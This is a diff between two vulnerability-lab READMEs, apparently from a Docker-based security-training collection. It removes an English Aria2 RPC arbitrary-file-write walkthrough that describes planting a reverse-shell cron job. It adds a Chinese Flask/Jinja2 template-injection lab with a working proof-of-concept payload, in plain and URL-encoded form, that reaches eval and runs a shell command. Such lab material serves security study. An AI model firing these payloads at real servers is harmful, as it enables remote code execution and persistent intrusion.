@@ -1,43 +1,39 @@
-# Aria2 Arbitrary File Write Vulnerability
+# Flask（Jinja2） 服务端模板注入漏洞
 
-[中文版本(Chinese version)](README.zh-cn.md)
+## 原理
 
-Aria2 is a lightweight, multi-protocol, multi-source download tool (supports HTTP/HTTPS, FTP, BitTorrent, Metalink) with built-in XML-RPC and JSON-RPC interfaces.
+参考文章：
 
-We can use the RPC interface to operate aria2 and download files to any directory, causing an arbitrary file write vulnerability.
+ - https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
+ - http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates
 
-Reference article:
+## 测试
 
- - https://paper.seebug.org/120/
-
-## Vulnerable Environment
-
-Start the vulnerable environment：
+编译及运行测试环境：
 
 ```
+docker-compose build
 docker-compose up -d
 ```
 
-6800 is the default port of aria2's rpc service. After the environment is started, access `http://your-ip:6800/`, and the service should return a 404 page.
+访问`http://your-ip/?name={{233*233}}`，得到54289，说明SSTI漏洞存在。
 
-## Exploit
+获取eval函数并执行任意python代码的POC：
 
-Because rpc communication requires json or xml, it is not convenient, so we can use a third-party UI to communicate with the target, such as http://binux.github.io/yaaw/demo/
+```
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("id").read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+```
 
-Open yaaw, click the configure button and fill in the target domain name running aria2: `http://your-ip:6800/jsonrpc`:
+访问`http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D`，得到执行结果：
 
 ![](1.png)
-
-Then click "Add +" to add a new download task. Fill in the "Dir" field with directory you want your file to be downloaded to and fill in the "File Name" field with the desired file name . For example, we will download a reverse shell by writing a crond task:
-
-![](2.png)
-
-At this time, arai2 will download the malicious file (the URL you specified) to the /etc/cron.d/ directory, with the file name "shell". In debian, all files in the /etc/cron.d directory will be read as a scheduled task configuration file (like crontab). Once written we can must wait for upto a minute before the reverse shell script is executed:
-
-![](3.png)
-
-> If the reverse shell is unsuccessful, note the format of the crontab file, and the newline must be `\n`, and a newline is required at the end of the file.
-
-Of course, we can also try to write other files, for more ways to exploit this vulnerability please refer to [this article][1]
-
-[1]: https://paper.seebug.org/120/
